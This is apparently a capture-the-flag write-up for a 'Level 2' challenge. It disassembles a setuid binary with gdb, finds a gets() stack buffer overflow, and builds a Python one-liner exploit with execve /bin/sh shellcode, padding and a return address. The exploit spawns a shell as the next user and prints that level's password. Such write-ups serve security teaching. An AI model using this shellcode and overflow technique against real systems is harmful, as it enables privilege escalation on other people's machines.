# Level 2

https://perso.liris.cnrs.fr/lionel.brunie/documents/notes-correction-attaque-buffer-overflow.pdf

## 1. Identity

```bash
$ id
uid=2021(level2) gid=2021(level2) groups=2021(level2),100(users)
```

## 2. Home directory

```bash
$ pwd
/home/user/level2

$ ls -la
[...]
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
[...]
```

## 3. Analyzing the file

Testing it :

```bash
$ ./level2
a
a
```

Expects an input and prints it

Nothing else...

**Let's use gdb**

```bash
gdb ./level2

(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
```

main() calls the function p()
```bash
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

p() calls the function gets() which is vulnerable to buffer overflows.

Let's try our program with a huge input :
```bash
$ /level2
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

0x55 -> U

The offset for overwrite EIP is 80.

For the exploit, we can't overwrite and use a stack address, because there is a check in the code

This code check if we try to overwrite the stack. The program quit if we do it :
```bash
if ((check & 0xb0000000) == 0xb0000000) {
	printf("(%p)\n", check);
	exit(1);
}

0x080484fb <+39>:	and    eax,0xb0000000
0x08048500 <+44>:	cmp    eax,0xb0000000
0x08048505 <+49>:	jne    0x8048527 <p+83>
```

https://shell-storm.org/shellcode/files/shellcode-575.html

Here is our exploit :

```bash
$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
```

## 4. Getting the flag

```bash
$ cat /tmp/exploit - | ./level2 
j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass  
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```

End of simulation
